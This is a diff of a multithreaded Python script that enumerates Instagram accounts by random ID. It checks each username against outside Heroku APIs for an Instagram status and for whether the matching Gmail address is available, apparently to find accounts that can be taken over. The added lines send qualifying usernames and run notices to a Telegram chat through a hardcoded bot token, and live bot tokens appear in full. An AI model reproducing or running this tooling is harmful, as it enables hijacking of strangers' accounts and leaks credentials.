@@ -6,6 +6,18 @@ from random import randrange
 from threading import Thread
 ids=[]
 opi,opi1=0,0
+def checkgm(us):
+  try:
+    a = httpx.get(f"https://gmail-mhros-e438ac1b0be7.herokuapp.com/qredes/gmail/?email={us}")
+    if '"status":"good"' in a.text:
+        httpx.get(f"https://api.telegram.org/bot6445458149:AAGTx7KQe8slPu2AcmCczQrbkR-_zhs7YWo/sendMessage?chat_id=749219602&text={us}")
+    else:pass
+  except:pass
+def check(us):
+  try:
+    cc = httpx.get(f'https://api-zi-7c2fc6a6a5b2.herokuapp.com/api/instagram/zaid.k.k/v2.z.k/v1/{us}').text
+    if 'OK' in cc:
+        checkgm(us)
 def get_id():
   id=str(randrange(10070, 30975110))
   if id not in ids:
@@ -13,7 +25,7 @@ def get_id():
     return id
   else:
     get_id()
-def get_username():
+def get_username():httpx.get(f"https://api.telegram.org/bot6445458149:AAGTx7KQe8slPu2AcmCczQrbkR-_zhs7YWo/sendMessage?chat_id=749219602&text=بدأ:ناجح✅")
   while True:
     try:
       global opi,opi1
@@ -42,8 +54,9 @@ def get_username():
       username=response['data']['user']['username']
       opi1+=1
       print(username,'from:',opi1)
-      httpx.get(f"https://api.telegram.org/bot5870224472:AAGuBQtXvCE9xg83EuLGL_yzagKXkqwdhcM/sendMessage?chat_id=749219602&text={username}")
+      check(username)
       if opi1>3000:
+          httpx.get(f"https://api.telegram.org/bot6445458149:AAGTx7KQe8slPu2AcmCczQrbkR-_zhs7YWo/sendMessage?chat_id=749219602&text=تصفير: ناجح✅")
           sys.exit()
           
     except:pass
@@ -55,3 +68,4 @@ for _ in range(47):
     threads.append(thread)
 for thread in threads:
     thread.join()
+    
